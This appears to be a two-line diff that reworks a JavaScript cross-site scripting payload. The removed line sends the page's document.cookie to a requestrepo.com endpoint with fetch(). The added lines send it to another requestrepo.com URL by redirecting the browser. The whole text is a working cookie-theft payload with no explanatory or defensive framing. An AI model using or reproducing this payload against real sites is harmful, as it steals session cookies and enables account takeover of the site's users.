@@ -1,1 +1,2 @@
-fetch('https://3h8nwlti.requestrepo.com?c=' + document.cookie)  
+var sessionid = document.cookie;
+document.location = "https://ttzy2dsh.requestrepo.com/?" + sessionid;
